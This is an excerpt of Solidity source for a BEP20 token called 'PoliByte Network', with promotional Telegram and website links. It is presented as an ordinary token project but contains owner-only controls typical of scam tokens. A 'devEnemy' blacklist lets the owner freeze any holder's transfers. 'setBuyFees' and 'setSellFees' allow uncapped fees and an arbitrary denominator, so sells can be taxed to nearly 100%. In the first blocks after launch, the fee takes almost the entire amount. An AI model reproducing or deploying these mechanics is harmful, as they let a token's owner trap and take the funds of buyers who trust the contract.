...
/*
Telegram : https://t.me/polibyte
Website : https://polibyte.art
*/
...
contract POLIBYTE is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    address DEV = 0xCCCba9A267CC4ab93dCa10e895AcD2ccFDC9aeff;

    address private autoLiquidityReceiver;
    address private marketingFeeReceiver;

    string constant _name = "PoliByte Network";
    string constant _symbol = "POLIBYTE";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 100000000 * 10**0 * (10 ** _decimals);

    uint256 public _maxBuyTxAmount = _totalSupply * 125 / 10000; 
    uint256 public _maxSellTxAmount = _totalSupply * 125 / 10000; 
    ...
    mapping (address => bool) public devEnemy;
    
    uint256 public liquidityFeeBuy = 1; 
    uint256 public buybackFeeBuy = 0;
    uint256 public rewardFeeBuy = 5;
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver =0xCCCba9A267CC4ab93dCa10e895AcD2ccFDC9aeff;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        require(!devEnemy[recipient] && !devEnemy[sender], 'Address is blacklisted');
    ...
    function getTotalFee(bool selling) public view returns (uint256) {
        if(launchedAt + dBlocks >= block.number){ return feeDenominator.sub(1); }
    ...
    function youareDevEnemy(address _address, bool _value) public authorized{
        devEnemy[_address] = _value;
    }
    ...
    function setBuyFees(uint256 _liquidityFeeBuy, uint256 _buybackFeeBuy, uint256 _rewardFeeBuy, uint256 _marketingFeeBuy, uint256 _devFeeBuy, uint256 _feeDenominator) external authorized {
        liquidityFeeBuy = _liquidityFeeBuy;
        buybackFeeBuy = _buybackFeeBuy;
        rewardFeeBuy = _rewardFeeBuy;
        marketingFeeBuy = _marketingFeeBuy;
        devFeeBuy = _devFeeBuy;
        totalFeeBuy = _liquidityFeeBuy.add(_buybackFeeBuy).add(_rewardFeeBuy).add(_marketingFeeBuy).add(_devFeeBuy);
        feeDenominator = _feeDenominator;
    }

    function setSellFees(uint256 _liquidityFeeSell, uint256 _buybackFeeSell, uint256 _rewardFeeSell, uint256 _marketingFeeSell, uint256 _devFeeSell, uint256 _feeDenominator) external authorized {
        liquidityFeeSell = _liquidityFeeSell;
        buybackFeeSell = _buybackFeeSell;
        rewardFeeSell = _rewardFeeSell;
        marketingFeeSell = _marketingFeeSell;
        devFeeSell = _devFeeSell;
        totalFeeSell = _liquidityFeeSell.add(_buybackFeeSell).add(_rewardFeeSell).add(_marketingFeeSell).add(_devFeeSell);
        feeDenominator = _feeDenominator;
    }
